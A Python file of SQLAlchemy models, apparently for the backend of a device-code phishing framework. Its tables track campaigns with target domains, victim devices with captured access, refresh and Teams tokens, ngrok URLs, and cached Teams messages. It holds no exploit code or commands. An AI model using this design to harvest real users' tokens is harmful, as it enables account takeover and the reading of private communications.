"""
Database models for the Kodes server.
"""
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import json

db = SQLAlchemy()

class DeviceInfo(db.Model):
    """
    Model representing a connected device and its authentication status.
    """
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(50), unique=True, nullable=False)
    name = db.Column(db.String(2000), nullable=True)
    upn = db.Column(db.String(2000), nullable=True)
    ipaddr = db.Column(db.String(2000), nullable=True)
    access_token = db.Column(db.String(2000), nullable=True)
    teams_token = db.Column(db.String(2000), nullable=True)
    refresh_token = db.Column(db.String(2000), nullable=True)
    device_code = db.Column(db.String(200), nullable=False)
    ngrok_url = db.Column(db.String(2000), nullable=True)
    last_seen = db.Column(db.DateTime, nullable=True)
    
    scopes = db.Column(db.Text, nullable=True)
    roles = db.Column(db.Text, nullable=True)
    token_expiry = db.Column(db.DateTime, nullable=True)
    has_admin_permissions = db.Column(db.Boolean, default=False)

    service_tokens = db.Column(db.Text, nullable=True)

    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=True)

    @property
    def is_online(self):
        """
        Check if the device is currently online based on last_seen timestamp.
        
        Returns:
            bool: True if device is online, False otherwise
        """
        if not self.last_seen:
            return False
        now = datetime.now()
        time_diff = now - self.last_seen
        return time_diff.total_seconds() < 180


class Campaign(db.Model):
    """
    Campaign model: target domain, flow URLs and target list
    for a deployment branch, defined in one place.
    """
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text, nullable=True)
    status = db.Column(db.String(20), nullable=False, default='draft')
    target_domain = db.Column(db.String(255), nullable=True)
    auth_site = db.Column(db.String(500), nullable=True)
    post_auth_url = db.Column(db.String(500), nullable=True)
    campaign_token = db.Column(db.String(32), unique=True, nullable=False, index=True)
    created_at = db.Column(db.DateTime, default=datetime.now, nullable=False)
    launched_at = db.Column(db.DateTime, nullable=True)
    completed_at = db.Column(db.DateTime, nullable=True)

    targets = db.relationship('Target', backref='campaign', lazy=True,
                              cascade='all, delete-orphan')
    devices = db.relationship('DeviceInfo', backref='campaign', lazy=True,
                              foreign_keys='DeviceInfo.campaign_id')

    @property
    def status_label(self):
        return {'draft': 'Draft', 'active': 'Active',
                'completed': 'Completed'}.get(self.status, self.status)


class Target(db.Model):
    """
    A target device record for a campaign (bulk import supported).
    """
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
    hostname = db.Column(db.String(50), nullable=False)
    expected_upn = db.Column(db.String(2000), nullable=True)
    note = db.Column(db.String(500), nullable=True)
    status = db.Column(db.String(20), nullable=False, default='pending')
    created_at = db.Column(db.DateTime, default=datetime.now, nullable=False)

    __table_args__ = (db.UniqueConstraint('campaign_id', 'hostname',
                                          name='uq_target_campaign_hostname'),)


class Log(db.Model):
    """
    Model for storing application logs.
    """
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(50), nullable=False)
    log_message = db.Column(db.String(500), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.now, nullable=False)


class TeamsMessages(db.Model):
    """
    Model for storing cached Teams messages data.
    """
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String(50), db.ForeignKey('device_info.hostname'), nullable=False)
    last_updated = db.Column(db.DateTime, default=datetime.now, nullable=False)
    status = db.Column(db.String(20), nullable=False, default='pending')
    messages_raw = db.Column(db.Text, nullable=True)
    messages_formatted = db.Column(db.Text, nullable=True)
    error_message = db.Column(db.Text, nullable=True)

    def set_status(self, status, error=None):
        """Update status and error message"""
        self.status = status
        if error:
            self.error_message = str(error)
        db.session.commit()
    

